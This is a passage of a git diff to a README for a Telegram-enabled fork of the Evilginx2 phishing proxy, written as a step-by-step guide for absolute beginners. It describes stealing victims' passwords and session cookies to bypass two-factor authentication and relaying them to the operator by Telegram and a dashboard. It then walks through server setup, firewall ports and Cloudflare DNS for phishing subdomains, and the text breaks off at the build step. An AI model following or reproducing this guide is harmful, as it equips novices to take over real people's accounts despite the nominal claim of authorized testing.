@@ -1,162 +1,318 @@
+---
+
+- [📋 Chapter 3: System Requirements](#-chapter-3-system-requirements)
+- [📦 Chapter 4: Prerequisites (What You Need Before Starting)](#-chapter-4-prerequisites-what-you-need-before-starting)
+- [🖥️ PHASE 1: Server Preparation](#-phase-1-server-preparation)
+- [☕ PHASE 2: Install Go Programming Language](#-phase-2-install-go-programming-language)
+- [☁️ PHASE 3: Cloudflare DNS Setup (Critical for SSL)](#-phase-3-cloudflare-dns-setup-critical-for-ssl)
+- [🔧 PHASE 4: Clone & Build Evilginx2](#-phase-4-clone--build-evilginx2)
+- [⚙️ PHASE 5: Evilginx2 Console Configuration](#-phase-5-evilginx2-console-configuration)
+- [📱 PHASE 6: Telegram Integration](#-phase-6-telegram-integration)
+- [🎣 PHASE 7: Phishlets & Lures](#-phase-7-phishlets--lures)
+- [🔄 PHASE 8: Systemd Service (Auto-Start on Boot)](#-phase-8-systemd-service-auto-start-on-boot)
+- [📊 PHASE 9: Web Dashboard](#-phase-9-web-dashboard)
+- [🐳 PHASE 10: Docker Deployment](#-phase-10-docker-deployment)
+- [✅ PHASE 11: Testing Your Setup](#-phase-11-testing-your-setup)
+- [🧠 PHASE 12: Pro Tips & Advanced Features](#-phase-12-pro-tips--advanced-features)
+- [📝 Full Command Cheat Sheet](#-full-command-cheat-sheet)
+- [🔧 Troubleshooting](#-troubleshooting)
+- [🧩 Inside the Code — Architecture Deep Dive](#-inside-the-code--architecture-deep-dive)
+- [📂 Complete File Reference](#-complete-file-reference)
+- [👏 Credits & Support](#-credits--support)
+
+<br>
+
+---
+
+<br>
+
+# 🧠 Chapter 1: What Is Evilginx2?
+
+Imagine you are standing **between** two people — Person A (your target) and Person B (a real website like Microsoft Office 365). Everything Person A says to Person B, you hear. Everything Person B says back, you hear. And you can **change** the messages before passing them along.
+
+**That's exactly what Evilginx2 does.**
+
+Evilginx2 is a **man-in-the-middle (MITM) attack framework** used for authorized penetration testing and security assessments. It acts as a **reverse proxy** between a victim and a real website (like Office 365, Google, LinkedIn, Facebook, etc.).
+
+<br>
+
+## The Simple Picture
+
+```
+                        ┌──────────────────────────┐
+                        │      YOUR VICTIM         │
+                        │  (opens an email link)   │
+                        └─────────────┬────────────┘
+                                      │
+                                      ▼
+                  ┌─────────────────────────────────────┐
+                  │       YOUR EVILGINX SERVER          │
+                  │                                     │
+                  │   "Hello! Let me forward you to     │
+                  │    the real login page..."          │
+                  └──────┬──────────────────────┬───────┘
+                         │                      │
+                         ▼                      ▼
+              ┌────────────────────┐  ┌────────────────────┐
+              │  WHAT GETS STOLEN │  │  REAL WEBSITE      │
+              │                    │  │                    │
+              │  ✓ Email/Username │  │  (e.g., Office 365)│
+              │  ✓ Password       │  │                    │
+              │  ✓ Session Cookie │  │  Victim logs in    │
+              │    (bypasses 2FA) │  │  successfully      │
+              │  ✓ 2FA Code       │  └────────────────────┘
+              └────────┬──────────┘
+                       │
+                       ▼
+        ┌─────────────────────────────────────┐
+        │  YOU GET INSTANT NOTIFICATION:      │
+        │                                     │
+        │  📱 Telegram Message                │
+        │  📊 Web Dashboard                   │
+        │  💾 Saved to Database               │
+        └─────────────────────────────────────┘
+```
+
+<br>
+
+## What This Means In Real Life
+
+When a victim types their credentials on a phishing page served by Evilginx2:
+
+1. **Evilginx2 forwards** the credentials to the REAL website (Microsoft, Google, etc.)
+2. **The real login succeeds** — the victim sees a normal login page, no errors
+3. **The real website sends back** a session cookie (this is what bypasses 2FA)
+4. **Evilginx2 steals** that cookie AND sends it to you
+5. **You get an instant Telegram message** with the username, password, and cookie file
+6. **You import the cookie** into your browser — and you're logged in as that user, **without needing their 2FA code**
+
+<br>
+
+---
+
+<br>
+
+# ✨ Chapter 2: What's Special About This Fork?
+
+This version by **@officialmonsterz** adds powerful features on top of the original Evilginx3 v3.3.0. Think of it as **taking a great tool and giving it a turbo upgrade**.
+
+<br>
+
+## Feature Comparison Table
+
+```
+┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│                                                     FEATURE TABLE                                           │
+├────────────────────────────────────────────────┬──────────────────────────┬──────────────────────────────────┤
+│                    FEATURE                     │     ORIGINAL EVILGINX3   │    THIS FORK (TELEGRAM EDITION)  │
+├────────────────────────────────────────────────┼──────────────────────────┼──────────────────────────────────┤
+│ 📱 Telegram Notifications                      │  ❌ Not available        │  ✅ Instant alerts on capture     │
+│ 📎 Token .txt File Attachments                 │  ❌ Not available        │  ✅ Tokens as downloadable files  │
+│ 🔄 Auto-Updating Messages                      │  ❌ Not available        │  ✅ Edits existing message        │
+│ ⏳ Async Notification Queue                    │  ❌ Not available        │  ✅ Non-blocking delivery         │
+│ 📊 Web Dashboard (port 5000)                   │  ❌ Not available        │  ✅ Full HTML UI + REST API       │
+│ 💾 BuntDB Database (embedded)                  │  ❌ Plain text logs      │  ✅ Zero-config, no SQL needed    │
+│ 📤 CSV/JSON Export                             │  ❌ Not available        │  ✅ One-click export              │
+│ 🔍 Session Search & Filter                     │  ❌ Not available        │  ✅ Search by any field           │
+│ 🌙 Dark Mode UI                                │  ❌ Not available        │  ✅ Toggleable dark/light mode    │
+│ 🔐 Dashboard Auth (Basic Auth)                 │  ❌ Not available        │  ✅ Username/password protection  │
+│ 🐳 Docker Multi-Stage (~18MB)                  │  ❌ Single-stage, huge   │  ✅ Minimal Alpine image          │
+│ 📁 Auto-Export to JSON/CSV                     │  ❌ Not available        │  ✅ Auto-save every session       │
+│ 🧹 Delete Sessions (Dashboard + API)           │  ❌ Not available        │  ✅ Remove from UI or API         │
+└────────────────────────────────────────────────┴──────────────────────────┴──────────────────────────────────┘
+```
+
+<br>
+
+## What Each Feature Does (In Plain English)
+
+| Feature | What It Means For You |
+|:--------|:----------------------|
+| **📱 Telegram Alerts** | As soon as someone types their password, you get a message on your phone. No need to watch a terminal screen. |
+| **📎 Token File** | The cookies come as a `.txt` file you can import into Chrome/Firefox. Just click and you're in. |
+| **🔄 No Spam** | If more cookies are found later, the SAME Telegram message is updated. Your chat stays clean. |
+| **📊 Web Dashboard** | A nice webpage where you can see ALL captured sessions. Search, filter, export, delete. |
+| **💾 BuntDB** | All data saves automatically in a single file. No need to install MySQL or PostgreSQL. |
+
+<br>
+
+---
+
+<br>
+
+# 📋 Chapter 3: System Requirements
+
+## Minimum Server Requirements
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                         MINIMUM SERVER REQUIREMENTS                         │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                             │
+│  🔹 CPU:      1 core (2 cores recommended)                                 │
+│  🔹 RAM:      512 MB (1 GB recommended)                                    │
+│  🔹 Storage:  10 GB free space                                             │
+│  🔹 OS:       Ubuntu 20.04 / 22.04 / 24.04 LTS OR Debian 11 / 12          │
+│  🔹 Network:  Public IP address (static)                                   │
+│  🔹 Ports:    22 (SSH), 53 (DNS), 80 (HTTP), 443 (HTTPS), 5000 (Dashboard)│
+│                                                                             │
+│  📌 RECOMMENDED: A $5-10/month VPS from DigitalOcean, Vultr,              │
+│     Hetzner, or any cloud provider works perfectly.                         │
+│                                                                             │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+<br>
+
+---
+
+<br>
+
+# 📦 Chapter 4: Prerequisites (What You Need Before Starting)
+
+Before you begin, make sure you have **all** of these ready:
+
+<br>
+
+## Checklist
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                         PREREQUISITES CHECKLIST                             │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                             │
+│  ☐  1. A VPS server (Ubuntu 20.04+) with root/SSH access                  │
+│                                                                             │
+│  ☐  2. A domain name (e.g., mytestdomain.com)                             │
+│        • Buy from Namecheap, GoDaddy, Porkbun, etc. ($1-10/year)          │
+│        • Example: "secure-login-page.com" or any unused domain            │
+│                                                                             │
+│  ☐  3. A Cloudflare account (free tier)                                   │
+│        • Go to cloudflare.com and sign up                                  │
+│        • Add your domain to Cloudflare                                     │
+│                                                                             │
+│  ☐  4. A Telegram account                                                 │
+│        • Download Telegram on your phone                                   │
+│                                                                             │
+│  ☐  5. Basic familiarity with SSH terminal                                │
+│        • You'll copy-paste commands — no coding required                   │
+│                                                                             │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+<br>
+
+---
+
+<br>
+
 <!--
 ╔══════════════════════════════════════════════════════════════════════════════╗
 ║                                                                            ║
-║                    🦊 EVILGINX2 — TELEGRAM EDITION                        ║
-║              Complete Deployment Guide for Absolute Beginners              ║
+║   ██████  ██   ██  █████  ███████ ███████      ██  ██████                 ║
+║   ██   ██ ██   ██ ██   ██ ██      ██           ██ ██                      ║
+║   ██████  ███████ ███████ ███████ ███████      ██ ██                      ║
+║   ██      ██   ██ ██   ██      ██      ██      ██ ██                      ║
+║   ██      ██   ██ ██   ██ ███████ ███████      ██  ██████                 ║
 ║                                                                            ║
-║                   Created by @officialmonsterz                             ║
-║          Contact: t.me/officialmonsterz | shapads@tutamail.com             ║
-║          Repo: github.com/officialmonsterz/evilginx2                       ║
+║                    PHASE 1: SERVER PREPARATION                            ║
 ║                                                                            ║
 ╚══════════════════════════════════════════════════════════════════════════════╝
 -->
 
-# 🦊 Evilginx2 — Telegram Edition
-## Man-in-the-Middle Attack Framework with 2FA Bypass & Telegram Alerts
+# 🖥️ PHASE 1: Server Preparation
 
-> **Version:** 3.3.0 — Community Edition  
-> **Author:** [@officialmonsterz](https://t.me/officialmonsterz)  
-> **Original Creator:** Kuba Gretzky ([@mrgretzky](https://github.com/kgretzky))  
-> **Contact:** [t.me/officialmonsterz](https://t.me/officialmonsterz) | `shapads@tutamail.com` | [github.com/officialmonsterz](https://github.com/officialmonsterz)
+**Goal:** Set up your server so it's ready to run Evilginx2.
 
----
+<br>
 
-## 📚 Table of Contents
+## Step 1.1: Connect to Your Server via SSH
 
-1. [What Is Evilginx2?](#-what-is-evilginx2)
-2. [What's Special About This Fork?](#-whats-special-about-this-fork)
-3. [System Requirements](#-system-requirements)
-4. [Prerequisites](#-prerequisites-you-need-before-starting)
-5. [PHASE 1: Server Preparation](#-phase-1-server-preparation)
-6. [PHASE 2: Install Go Programming Language](#-phase-2-install-go-programming-language)
-7. [PHASE 3: Cloudflare DNS Setup](#-phase-3-cloudflare-dns-setup-critical-for-autocert)
-8. [PHASE 4: Clone & Build Evilginx2](#-phase-4-clone--build-evilginx2)
-9. [PHASE 5: Evilginx2 Console Configuration](#-phase-5-evilginx2-console-configuration)
-10. [PHASE 6: Telegram Integration](#-phase-6-telegram-integration)
-11. [PHASE 7: Phishlets & Lures](#-phase-7-phishlets--lures)
-12. [PHASE 8: Systemd Service (Auto-Start on Boot)](#-phase-8-systemd-service-auto-start-on-boot)
-13. [PHASE 9: Web Dashboard](#-phase-9-web-dashboard)
-14. [PHASE 10: Docker Deployment](#-phase-10-docker-deployment)
-15. [PHASE 11: Testing Your Setup](#-phase-11-testing-your-setup)
-16. [PHASE 12: Pro Tips & Advanced Features](#-phase-12-pro-tips--advanced-features)
-17. [Full Command Cheat Sheet](#-full-command-cheat-sheet)
-18. [Troubleshooting](#-troubleshooting)
-19. [Inside the Code — Architecture Overview](#-inside-the-code--architecture-overview)
-20. [Credits & Support](#-credits--support)
+SSH (Secure Shell) is how you remotely control your server. Your hosting provider should have given you:
 
----
+- **Server IP address** (e.g., `173.44.141.147`)
+- **Root password** or **SSH key**
 
-## 🧠 What Is Evilginx2?
-
-Evilginx2 is a **man-in-the-middle (MITM) attack framework** used for authorized penetration testing and security assessments. It acts as a **reverse proxy** between a victim and a real website (like Office 365, Google, LinkedIn, etc.).
-
-### How It Works
-
-```
-Victim's Browser ──► Evilginx Server ──► Real Website (e.g., login.microsoftonline.com)
-                            │
-                            ▼
-              Captures Login Credentials
-                    + Session Cookies
-                    (Bypasses 2FA/MFA)
-                            │
-                            ▼
-              Telegram Notification + Web Dashboard
-```
-
-When a victim types their credentials on a phishing page served by Evilginx2, it:
-
-1. **Proxies** the credentials to the real website (login succeeds — victim sees no error)
-2. **Steals** the session cookie (which bypasses 2FA/MFA)
-3. **Sends** you an instant Telegram message with all captured data
-4. **Saves** everything to the built-in database and web dashboard
-
----
-
-## ✨ What's Special About This Fork?
-
-This version by **@officialmonsterz** adds powerful features on top of the original Evilginx3 v3.3.0:
-
-| Feature | Description | Files Involved |
-|---|---|---|
-| 📱 **Telegram Notifications** | Instant alerts when credentials are captured | `core/notify.go`, `core/telegram_queue.go` |
-| 📎 **Session Files as Attachments** | Tokens sent as `.txt` attachments with formatted messages | `core/notify.go` (function `createTxtFile`) |
-| 🔄 **Auto-Updating Messages** | If more tokens arrive, the same Telegram message gets **edited** (not a new message) | `core/notify.go` (function `editMessageFile`) |
-| ⏳ **Async Notification Queue** | Non-blocking notification delivery via buffered channel | `core/telegram_queue.go` |
-| 📊 **Web Dashboard** | Full web UI to view, search, filter, export, and delete sessions | `core/dashboard.go` (port 5000) |
-| 💾 **Built-in BuntDB Database** | Zero-config embedded database — no MySQL/PostgreSQL needed | `database/database.go`, `database/db_session.go` |
-| 🐳 **Multi-Stage Docker Build** | Minimal Alpine-based Docker image (only ~18MB) | `Dockerfile`, `.dockerignore` |
-| 🔐 **Dashboard Authentication** | Username/password protection for the web UI | `core/dashboard.go` (basic auth) |
-| 📤 **CSV/JSON Export** | Export captured sessions for reporting | `core/dashboard.go` (API endpoints) |
-| 🔍 **Session Search & Filtering** | Search by username, password, phishlet name, or IP | `core/dashboard.go` (query params) |
-| 🗑️ **Delete Sessions** | Remove individual sessions from the UI | `core/dashboard.go` (DELETE endpoint) |
-
-### Repository Structure
-
-```
-evilginx2/
-├── main.go              # Entry point with dashboard flags + Telegram queue init
-├── core/
-│   ├── http_proxy.go    # MITM proxy engine (modified for Telegram integration)
-│   ├── session.go       # In-memory session management
-│   ├── config.go        # Configuration (includes Telegram chatid/teletoken setters)
-│   ├── notify.go        # Telegram notification logic + token extraction + file creation
-│   ├── telegram_queue.go# Async notification queue (buffered channel pattern)
-│   ├── tsession.go      # Telegram session struct + database reader
-│   ├── dashboard.go     # Web dashboard server (HTML/API)
-│   └── ...              # Other standard Evilginx files
-├── database/
-│   ├── database.go      # BuntDB wrapper interface
-│   └── db_session.go    # Session CRUD + Session struct definition
-├── phishlets/           # YAML phishing templates
-├── redirectors/         # HTML redirector pages
-├── Dockerfile           # Multi-stage Docker build
-└── .dockerignore        # Docker build exclusions
-
----
-
-# 🚀 PHASE 1: Server Preparation
-
-## Step 1.1: Connect via SSH
+Open a terminal (on Mac/Linux) or PowerShell (on Windows) and type:
 
 ```bash
 ssh root@173.44.141.147
 ```
 
-Replace with your actual server IP. Type `yes` if asked about the fingerprint.
+> **Replace `173.44.141.147` with your actual server IP.**
 
-## Step 1.2: Update System & Install Packages
+The first time you connect, you'll see:
+```
+The authenticity of host '173.44.141.147 (173.44.141.147)' can't be established.
+Are you sure you want to continue connecting (yes/no)?
+```
+
+Type `yes` and press Enter. Then enter your password (you won't see characters as you type — that's normal).
+
+<br>
+
+## Step 1.2: Update Your Server
+
+This ensures your server has the latest security patches and software packages.
 
 ```bash
 sudo apt update && sudo apt upgrade -y
+```
+
+> **What this does:** `apt update` checks for available updates. `apt upgrade -y` installs them. The `-y` means "answer yes to any prompts."
+
+<br>
+
+## Step 1.3: Install Essential Software Packages
+
+```bash
 sudo apt install nano wget curl git make build-essential screen fail2ban htop net-tools ufw -y
 ```
 
-| Package | Purpose |
-|---|---|
-| `nano` | Easy text editor |
-| `wget` / `curl` | Download files & test connections |
-| `git` | Clone the repository |
-| `make` / `build-essential` | Build tools for Go compilation |
-| `screen` | Run background sessions |
-| `fail2ban` | Blocks brute-force SSH attacks |
-| `htop` | Real-time system monitoring |
-| `net-tools` | Network utilities |
-| `ufw` | Firewall management |
+### What Each Package Does
 
-## Step 1.3: Configure Firewall (UFW)
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                         PACKAGE EXPLANATIONS                                │
+├──────────────────────┬──────────────────────────────────────────────────────┤
+│        PACKAGE       │                     PURPOSE                          │
+├──────────────────────┼──────────────────────────────────────────────────────┤
+│  nano                │ Simple text editor — like Notepad for the terminal   │
+│  wget                │ Downloads files from the internet                    │
+│  curl                │ Tests connections and APIs                           │
+│  git                 │ Downloads code from GitHub                           │
+│  make                │ Helps build (compile) programs                       │
+│  build-essential     │ Tools needed for compiling Go code                   │
+│  screen              │ Lets you run programs in the background              │
+│  fail2ban            │ Blocks hackers trying to guess your SSH password    │
+│  htop                │ Shows what your server is doing (like Task Manager) │
+│  net-tools           │ Network diagnostic utilities                         │
+│  ufw                 │ Firewall — controls which ports are open             │
+└──────────────────────┴──────────────────────────────────────────────────────┘
+```
+
+<br>
+
+## Step 1.4: Configure the Firewall (UFW)
+
+Your server needs certain **ports** open for Evilginx2 to work. Think of ports like doors — you need to unlock the right ones.
 
 ```bash
-sudo ufw allow 22/tcp    # SSH
-sudo ufw allow 53/udp    # DNS (for Let's Encrypt challenges)
-sudo ufw allow 80/tcp    # HTTP (critical for autocert)
-sudo ufw allow 443/tcp   # HTTPS (main phishing traffic)
-sudo ufw allow 5000/tcp  # Dashboard
-sudo ufw --force enable
+sudo ufw allow 22/tcp     # SSH — lets you connect to the server
+sudo ufw allow 53/udp     # DNS — needed for SSL certificate verification
+sudo ufw allow 80/tcp     # HTTP — needed for SSL certificate verification
+sudo ufw allow 443/tcp    # HTTPS — where your phishing pages live
+sudo ufw allow 5000/tcp   # Dashboard — the web interface
+sudo ufw --force enable   # Turn on the firewall
+```
+
+### Verify Your Firewall Is Set Up Correctly
+
+```bash
 sudo ufw status
 ```
 
-Expected output:
+**Expected output:**
 
 ```
 Status: active
@@ -170,41 +326,104 @@ To                         Action      From
 5000/tcp                   ALLOW       Anywhere
 ```
 
-## Step 1.4: Disable Conflicting DNS Service
+> **If you see something different:** Run the `ufw allow` commands again. Make sure you didn't miss one.
 
-Ubuntu's `systemd-resolved` uses port 53, which conflicts with Evilginx's built-in DNS server:
+<br>
+
+## Step 1.5: Fix the DNS Port Conflict
+
+This is a **very common problem** that trips people up. Here's what's happening:
+
+Ubuntu has a built-in service called `systemd-resolved` that uses **port 53** for DNS. Evilginx2 ALSO needs port 53 for its DNS server. They can't both use it at the same time.
+
+**We need to disable the built-in DNS resolver:**
 
 ```bash
-# Stop and disable the built-in DNS resolver
+# Step A: Stop the built-in DNS resolver immediately
 sudo systemctl stop systemd-resolved
+
+# Step B: Prevent it from starting again on reboot
 sudo systemctl disable systemd-resolved
 
-# Remove the current (symlinked) resolv.conf
+# Step C: Remove the current DNS configuration file
 sudo rm -f /etc/resolv.conf
 
-# Set Cloudflare DNS as system resolvers
+# Step D: Set Cloudflare as your DNS servers (fast and reliable)
 echo "nameserver 1.1.1.1" | sudo tee /etc/resolv.conf
 echo "nameserver 1.0.0.1" | sudo tee -a /etc/resolv.conf
 
-# Lock the file so nothing overwrites it
+# Step E: Lock the file so nothing can overwrite it
 sudo chattr +i /etc/resolv.conf
 ```
 
-> **⚠️ If you get "Operation not permitted":** This means `/etc/resolv.conf` is managed by systemd-resolved or netplan. The `systemctl mask systemd-resolved` command should resolve this.
+### What Each Command Does
 
-## Step 1.5: Reboot
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    DNS PORT FIX — EXPLANATION                               │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                             │
+│  📌 The Problem:                                                           │
+│  systemd-resolved uses port 53. Evilginx2 needs port 53.                   │
+│  They conflict. One must go.                                                │
+│                                                                             │
+│  📌 The Solution:                                                         │
+│  We disable systemd-resolved and tell the server to use Cloudflare's        │
+│  DNS servers (1.1.1.1 and 1.0.0.1) directly.                               │
+│                                                                             │
+│  📌 Why Cloudflare DNS?                                                    │
+│  It's fast, free, and reliable. Your server uses it to look up domain      │
+│  names when it needs to connect to the internet.                           │
+│                                                                             │
+│  📌 Why "chattr +i"?                                                      │
+│  This makes the file "immutable" — nothing can change it, not even root.   │
+│  This prevents any program from accidentally overwriting our DNS settings. │
+│                                                                             │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+<br>
+
+## Step 1.6: Reboot Your Server
+
+This ensures everything is clean and all changes take effect.
 
 ```bash
 sudo reboot
 ```
 
-Wait 30-60 seconds, then reconnect via SSH.
+> **Wait 30-60 seconds**, then reconnect via SSH:
+> ```bash
+> ssh root@173.44.141.147
+> ```
+
+<br>
 
 ---
 
+<br>
+
+<!--
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                                                                            ║
+║    ██████   ██   ██  █████  ███████ ███████       ██████                   ║
+║    ██   ██  ██   ██ ██   ██ ██      ██           ██   ██                  ║
+║    ██████   ███████ ███████ ███████ ███████      ██████                    ║
+║    ██   ██  ██   ██ ██   ██      ██      ██      ██   ██                  ║
+║    ██████   ██   ██ ██   ██ ███████ ███████      ██████                    ║
+║                                                                            ║
+║                 PHASE 2: INSTALL GO PROGRAMMING LANGUAGE                   ║
+║                                                                            ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+-->
+
 # ☕ PHASE 2: Install Go Programming Language
 
-Evilginx2 is written in Go. We need version 1.22.5 specifically.
+**Goal:** Install Go (version 1.22.5) — the programming language Evilginx2 is written in.
+
+Evilginx2 is written in **Go** (also called Golang). We need to install it so we can compile (build) the Evilginx2 program from source code.
+
+<br>
 
 ## Step 2.1: Download Go
 
@@ -213,99 +432,211 @@ cd ~
 wget https://go.dev/dl/go1.22.5.linux-amd64.tar.gz
 ```
 
-## Step 2.2: Install Go
+> **What this does:** Downloads the Go 1.22.5 package to your home directory. The file is about 70MB.
+
+<br>
+
+## Step 2.2: Remove Any Old Go Installation
 
 ```bash
-# Remove any previous Go installation
 sudo rm -rf /usr/local/go
+```
 
-# Extract to /usr/local
+> **What this does:** Removes any previous Go installation (if one exists). We want a clean install.
+
+<br>
+
+## Step 2.3: Extract Go to the Installation Directory
+
+```bash
 sudo tar -C /usr/local -xzf go1.22.5.linux-amd64.tar.gz
 ```
 
-## Step 2.3: Add Go to PATH
+> **What this does:** Unpacks Go into `/usr/local/go` — the standard location for Go on Linux.
+
+<br>
+
+## Step 2.4: Add Go to Your PATH
+
+The "PATH" is a list of directories where your system looks for executable programs. We need to tell it where Go lives.
 
 ```bash
 echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
 source ~/.bashrc
+```
+
+> **What this does:**
+> - `~/.bashrc` is a file that runs every time you open a terminal
+> - We add Go's directory to the PATH so you can type `go` from anywhere
+> - `source ~/.bashrc` applies the change immediately
+
+<br>
+
+## Step 2.5: Verify Go Is Installed
+
+```bash
 go version
 ```
 
-Expected output: `go version go1.22.5 linux/amd64`
+**Expected output:**
+```
+go version go1.22.5 linux/amd64
+```
 
-## Step 2.4: Clean Up Download
+> **If you see a different version or an error:** Go back to Step 2.1 and try again. Make sure you downloaded the correct file.
+
+<br>
+
+## Step 2.6: Clean Up the Download
 
 ```bash
 rm go1.22.5.linux-amd64.tar.gz
 ```
 
+> **What this does:** Removes the downloaded .tar.gz file (we don't need it anymore after extraction).
+
+<br>
+
 ---
 
-# ☁️ PHASE 3: Cloudflare DNS Setup
+<br>
 
-This is the most critical phase. SSL certificates **will fail** if DNS is misconfigured.
+<!--
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                                                                            ║
+║     ██████  ██       ██████  ██    ██ ██████  ███████  ██████  ██          ║
+║    ██      ██      ██    ██ ██    ██ ██   ██ ██      ██    ██ ██          ║
+║    ██      ██      ██    ██ ██    ██ ██████  █████   ██    ██ ██          ║
+║    ██      ██      ██    ██ ██    ██ ██   ██ ██      ██    ██ ██          ║
+║     ██████ ███████  ██████   ██████  ██   ██ ███████  ██████  ███████     ║
+║                                                                            ║
+║                   PHASE 3: CLOUDFLARE DNS SETUP                           ║
+║                         (CRITICAL FOR SSL)                                 ║
+║                                                                            ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+-->
+
+# ☁️ PHASE 3: Cloudflare DNS Setup (Critical for SSL)
+
+**Goal:** Point your domain to your server through Cloudflare so SSL certificates work.
+
+> **⚠️ This is the MOST IMPORTANT phase.** If you mess this up, SSL certificates will fail and your phishing pages won't load. **Read each step carefully.**
+
+<br>
 
 ## Step 3.1: Add Your Domain to Cloudflare
 
-1. Go to [cloudflare.com](https://cloudflare.com) and log in
-2. Click **"Add a Site"**
-3. Enter your domain (e.g., `entreexampdremd.online`)
-4. Select the **Free** plan
-5. Cloudflare will scan existing DNS records
-6. **Note the two nameservers** Cloudflare gives you (e.g., `arya.ns.cloudflare.com` and `matt.ns.cloudflare.com`)
+1. Go to [cloudflare.com](https://cloudflare.com) and log in (or create a free account)
+2. Click **"Add a Site"** button
+3. Enter your domain name (e.g., `entreexampdremd.online`)
+4. Click **"Add Site"**
+5. Select the **Free** plan
+6. Cloudflare will scan your existing DNS records (there probably aren't any yet)
+7. **IMPORTANT:** Write down the two nameservers Cloudflare gives you. They look like:
+   - `arya.ns.cloudflare.com`
+   - `matt.ns.cloudflare.com`
 
-## Step 3.2: Change Nameservers at Your Registrar
+<br>
 
-Go to your domain registrar (Namecheap, GoDaddy, etc.):
+## Step 3.2: Change Nameservers at Your Domain Registrar
 
-1. Find **DNS / Nameservers** settings
-2. Change to **Custom Nameservers**
-3. Enter the two Cloudflare nameservers from Step 3.1
-4. Save — propagation takes 5–15 minutes
+Your "registrar" is where you bought your domain (Namecheap, GoDaddy, Porkbun, etc.).
+
+1. Log in to your registrar's website
+2. Find **DNS Settings** or **Nameservers**
+3. Change from "Default" or "Registrar's DNS" to **Custom Nameservers**
+4. Enter the **two Cloudflare nameservers** from Step 3.1
+5. Save the changes
+
+> **DNS propagation takes 5-15 minutes** (sometimes up to 24 hours, but usually much faster).
+
+<br>
 
 ## Step 3.3: Add DNS Records in Cloudflare
 
-**⚠️ CRITICAL:** Set all records to **DNS Only** (grey cloud icon), **NOT** Proxy (orange cloud). Evilginx2 needs direct access to ports 80 and 443.
+**⚠️ CRITICAL:** Set all records to **DNS Only** (grey cloud icon), **NOT** Proxy (orange cloud). Evilginx2 needs direct connections to ports 80 and 443.
 
-| Type | Name | Content | Proxy Status |
-|---|---|---|---|
-| A | `@` (root) | `173.44.141.147` | ❌ DNS Only |
-| A | `login` | `173.44.141.147` | ❌ DNS Only |
-| A | `admin` | `173.44.141.147` | ❌ DNS Only |
-| A | `*` (wildcard) | `173.44.141.147` | ❌ DNS Only |
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                         DNS RECORDS TO ADD                                  │
+├──────────┬──────────┬─────────────────────────┬─────────────────────────────┤
+│   TYPE   │   NAME   │       CONTENT           │       PROXY STATUS          │
+├──────────┼──────────┼─────────────────────────┼─────────────────────────────┤
+│    A     │    @     │   173.44.141.147        │   ❌ DNS Only (grey cloud) │
+│    A     │  login   │   173.44.141.147        │   ❌ DNS Only (grey cloud) │
+│    A     │  admin   │   173.44.141.147        │   ❌ DNS Only (grey cloud) │
+│    A     │    *     │   173.44.141.147        │   ❌ DNS Only (grey cloud) │
+└──────────┴──────────┴─────────────────────────┴─────────────────────────────┘
+```
 
-**Why each record is needed:**
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    WHAT EACH DNS RECORD DOES                                │
+├──────────┬──────────────────────────────────────────────────────────────────┤
+│  RECORD  │  PURPOSE                                                         │
+├──────────┼──────────────────────────────────────────────────────────────────┤
+│    @     │  The root domain — needed for base configuration                 │
+│  login   │  Where your phishing page lives (login.yourdomain.com)           │
+│  admin   │  For accessing the web dashboard (admin.yourdomain.com:5000)     │
+│    *     │  Wildcard — catches ANY subdomain you might use later            │
+└──────────┴──────────────────────────────────────────────────────────────────┘
+```
 
-| Record | Purpose |
-|---|---|
-| `@` (root) | Base domain for the phishlet hostname |
-| `login` | Where your phishing page lives (`login.yourdomain.com`) |
-| `admin` | Dashboard subdomain |
-| `*` (wildcard) | Catches any subdomain you might want to use |
+<br>
 
 ## Step 3.4: Configure SSL/TLS Settings
 
-In Cloudflare dashboard:
+In the Cloudflare dashboard:
 
 1. Go to **SSL/TLS** → **Overview**
-2. Set **SSL/TLS encryption level** to **Full** (NOT Full Strict)
+2. Set **SSL/TLS encryption level** to **Full** (NOT "Full Strict")
 3. Go to **Edge Certificates** tab
 4. Turn **Always Use HTTPS** → **ON**
 
+<br>
+
 ## Step 3.5: Verify DNS Propagation
+
+Check that your DNS records are working:
 
 ```bash
 dig @1.1.1.1 entreexampdremd.online +short
 dig @1.1.1.1 login.entreexampdremd.online +short
 ```
 
-Both should return your server IP. Wait 10–15 minutes if they don't.
+Both commands should return your server's IP address (e.g., `173.44.141.147`).
+
+> **If nothing is returned:** Wait 10-15 minutes and try again. DNS propagation takes time.
+
+<br>
 
 ---
 
+<br>
+
+<!--
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                                                                            ║
+║    ██████  ██   ██  ██████  ███    ██ ███████      ██████                  ║
+║    ██      ██   ██ ██    ██ ████   ██ ██          ██   ██                  ║
+║    ██      ███████ ██    ██ ██ ██  ██ █████       ██████                   ║
+║    ██      ██   ██ ██    ██ ██  ██ ██ ██          ██   ██                  ║
+║     ██████ ██   ██  ██████  ██   ████ ███████     ██████                   ║
+║                                                                            ║
+║                PHASE 4: CLONE & BUILD EVILGINX2                            ║
+║                                                                            ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+-->
+
 # 🔧 PHASE 4: Clone & Build Evilginx2
 
+**Goal:** Download the Evilginx2 source code and compile it into a working program.
+
+<br>
+
 ## Step 4.1: Clone the Repository
+
+"Cloning" means downloading a copy of the code from GitHub:
 
 ```bash
 cd /root
@@ -313,90 +644,202 @@ git clone https://github.com/officialmonsterz/evilginx2.git
 cd evilginx2
 ```
 
-## Step 4.2: Build the Binary
